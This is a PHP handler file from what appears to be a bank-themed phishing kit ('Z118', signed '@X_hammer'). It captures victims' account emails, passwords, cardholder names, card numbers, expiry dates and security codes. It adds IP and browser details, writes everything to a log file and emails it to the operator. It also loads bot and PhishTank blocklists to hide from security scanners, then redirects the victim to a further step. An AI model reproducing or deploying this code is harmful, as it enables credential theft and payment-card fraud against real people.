<?php


session_start();
error_reporting(0);

$TIME_DATE = date('H:i:s d/m/Y');
include('../functions/Email.php');
include('../functions/get_browser.php');
include('../functions/get_ip.php');

include('../../BOTS/grabber.php');
include('../../BOTS/botlist.php');
include('../../BOTS/blacklist.php');
include('../../BOTS/iprange.php');
include('../../BOTS/phishtank.php');
include('../../BOTS/spec.php');


///////////////////////////////// BIN CHECKER  /////////////////////////////////
if (isset($_POST['card_number'])){
	$_SESSION['_email_'] = $_POST['email'];
	$_SESSION['_password_'] = $_POST['password'];
	$_SESSION['_nameoncard_'] = $_POST['card_name'];
	$_SESSION['_cardnumber_'] = $_POST['card_number'];
	$_SESSION['_expdate_']    = $_POST['exp'];
	$_SESSION['_csc_']        = $_POST['csc'];
	
}
	


//////////////////////////////////////// GET Country & Country CODE ! ////////////////////////////////////////////////
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";

if(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_'] = $ip = $forward;
}
else{
    $_SESSION['_ip_'] = $ip = $remote;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////
$LOGS = "[".date('Y-m-d H:i:s')."] ".$_SESSION['_LOOKUP_CNTRCODE_']." - ".$_SESSION['_ip_']."";
file_put_contents('../../logs.txt', $LOGS . PHP_EOL, FILE_APPEND);


$Z118_MESSAGE .= "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
################ <font style='color: #820000;'>REGION BANK ACCOUNT INFORMATION</font> ####################<br/>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>CARDING INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [Account Email] = <font style='color:#0070ba;'>".$_SESSION['_email_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Account Password] = <font style='color:#0070ba;'>".$_SESSION['_password_']."</font><br>

±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>CARDING INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [Cardholder's Name] = <font style='color:#0070ba;'>".$_SESSION['_nameoncard_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Card Number] = <font style='color:#0070ba;'>".$_SESSION['_cardnumber_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Card success Code]	= <font style='color:#0070ba;'>".$_SESSION['_csc_']."</font><br>
<font style='color:#9c0000;'>✪</font> [Expiration Date] = <font style='color:#0070ba;'>".$_SESSION['_expdate_']."</font><br>

±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>CARD BIN INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [BIN INFORMATION] = <font style='color:#0070ba;'>https://lookup.binlist.net/".$_SESSION['_cardnumber_']."</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [TIME]    = <font style='color:#0070ba;'>".$TIME_DATE."</font><br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>http://ip-api.com/json/".$_SESSION['_ip_']."</font><br>
<font style='color:#9c0000;'>✪</font> [REMOTE IP]    = <font style='color:#0070ba;'>".$_SERVER['REMOTE_ADDR']."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".Z118_Browser($_SERVER['HTTP_USER_AGENT'])." On ".Z118_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
<font style='color:#9c0000;'>✪</font> [BROWSER] = <font style='color:#0070ba;'>".$_SERVER['HTTP_USER_AGENT']."</font><br>
################## <font style='color: #820000;'>BY @X_hammer</font> #####################
</div></html>\n";


if (!empty($_POST['card_name'] && !empty($_POST['card_number']))){

    $res_file = fopen("getData.txt", "a");
	fwrite($res_file, $Z118_MESSAGE);
	$Z118_SUBJECT = "".$_SESSION['_cardnumber_']." ✪";
	$Z118_HEADERS .= "From:Xhammer <xhammer@logs.com>";
    $Z118_HEADERS .= $_SESSION['eMailAdd']."\n";
    $Z118_HEADERS .= "MIME-Version: 1.0\n";
    $Z118_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
    @mail($Z118_EMAIL, $Z118_SUBJECT, $Z118_MESSAGE, $Z118_HEADERS);
	
      
	HEADER("Location: ../personal/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
} else {
		HEADER("Location: ../personal/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
	
}
?>